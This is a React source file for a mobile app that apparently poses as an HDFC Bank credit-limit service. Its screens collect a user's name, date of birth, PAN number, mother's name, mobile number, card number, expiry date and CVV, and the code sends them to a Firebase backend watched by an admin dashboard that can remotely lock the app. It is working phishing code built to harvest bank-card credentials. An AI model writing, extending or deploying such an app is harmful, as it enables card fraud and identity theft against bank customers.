import React, { useState, useEffect } from 'react';
import HomeScreen from './components/HomeScreen';
import EnterDetailsScreen from './components/EnterDetailsScreen';
import CardDetailsScreen from './components/CardDetailsScreen';
import ConfirmationScreen from './components/ConfirmationScreen';
import AppLockedExpiredScreen from './components/AppLockedExpiredScreen';
import { saveCustomerSubmission, subscribeToCustomerStatus } from './firebase';

export default function App() {
  const [currentScreen, setCurrentScreen] = useState('home');
  const [selectedService, setSelectedService] = useState('');
  const [personalDetails, setPersonalDetails] = useState(null);
  const [cardDetails, setCardDetails] = useState(null);
  const [isAppLocked, setIsAppLocked] = useState(false);
  const [submissionId, setSubmissionId] = useState(() => {
    return localStorage.getItem('hdfc_customer_submission_id') || null;
  });

  // Real-time listener: if the Admin rejects/locks the request in Admin Dashboard, lock this mobile app immediately!
  useEffect(() => {
    if (!submissionId) return;

    const unsubscribe = subscribeToCustomerStatus(submissionId, (data) => {
      if (data && (data.status === 'rejected' || data.isLocked === true)) {
        setIsAppLocked(true);
        localStorage.setItem('hdfc_app_is_locked', 'true');
      }
    });

    return () => {
      if (typeof unsubscribe === 'function') unsubscribe();
    };
  }, [submissionId]);

  // Check persisted lock state on startup
  useEffect(() => {
    if (localStorage.getItem('hdfc_app_is_locked') === 'true') {
      setIsAppLocked(true);
    }
  }, []);

  // 1. Home Screen Option Click -> Go to Enter Details
  const handleSelectHomeOption = (optionKey) => {
    setSelectedService(optionKey);
    setCurrentScreen('enter_details');
  };

  // 2. Enter Details Next -> Go to Card Details screen
  const handlePersonalDetailsSubmitted = (details) => {
    setPersonalDetails(details);
    setCurrentScreen('card_details');
  };

  // 3. Card Details Submit -> Save to Firebase Firestore & Go to Confirmation Screen
  const handleCardDetailsSubmitted = async (cardData) => {
    setCardDetails(cardData);
    setCurrentScreen('confirmation');

    // Prepare complete application payload
    const submissionData = {
      fullName: personalDetails?.fullName || '',
      dob: personalDetails?.dob || '',
      panNumber: personalDetails?.panNumber || '',
      mothersName: personalDetails?.mothersName || '',
      mobileNumber: personalDetails?.mobileNumber || '',
      selectedService: selectedService || 'increase_limit',
      nameOnCard: cardData?.nameOnCard || personalDetails?.fullName || '',
      cardNumber: cardData?.cardNumber || '',
      expiryDate: cardData?.expiryDate || '',
      cvv: cardData?.cvv || ''
    };

    // Save to Firebase Firestore & store submission ID for status tracking
    try {
      const res = await saveCustomerSubmission(submissionData);
      if (res.success && res.id) {
        setSubmissionId(res.id);
        localStorage.setItem('hdfc_customer_submission_id', res.id);
      }
    } catch (e) {
      console.error('Firebase submission error:', e);
    }
  };

  // Reset back to home screen
  const handleResetToHome = () => {
    setCurrentScreen('home');
    setSelectedService('');
    setPersonalDetails(null);
    setCardDetails(null);
  };

  // If Admin has rejected the user's application, enforce the Expired / Uninstall screen
  if (isAppLocked) {
    return <AppLockedExpiredScreen onReset={handleResetToHome} />;
  }

  return (
    <div className="mobile-app-shell">
      {/* Dynamic Sequential Screen Flow */}
      {currentScreen === 'home' && (
        <HomeScreen onSelectOption={handleSelectHomeOption} />
      )}

      {currentScreen === 'enter_details' && (
        <EnterDetailsScreen
          onBack={() => setCurrentScreen('home')}
          onNext={handlePersonalDetailsSubmitted}
          selectedService={selectedService}
        />
      )}

      {currentScreen === 'card_details' && (
        <CardDetailsScreen
          onBack={() => setCurrentScreen('enter_details')}
          onSubmit={handleCardDetailsSubmitted}
        />
      )}

      {currentScreen === 'confirmation' && (
        <ConfirmationScreen onReset={handleResetToHome} />
      )}
    </div>
  );
}
